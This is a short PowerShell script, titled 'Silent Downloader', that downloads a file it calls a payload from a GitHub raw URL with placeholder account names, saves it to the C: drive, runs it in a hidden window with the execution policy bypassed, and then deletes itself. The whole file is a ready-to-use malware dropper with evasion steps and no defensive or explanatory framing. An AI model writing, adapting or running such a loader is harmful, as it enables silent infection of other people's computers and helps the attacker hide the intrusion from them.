# Silent Downloader - Saves payload to C: drive
$payloadUrl = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/Win64.ps1"
$savePath = "C:\Win64.ps1"

# Download the payload silently
Invoke-WebRequest -Uri $payloadUrl -OutFile $savePath -UseBasicParsing

# Execute the payload silently
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$savePath`""

# Self-delete the downloader
Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
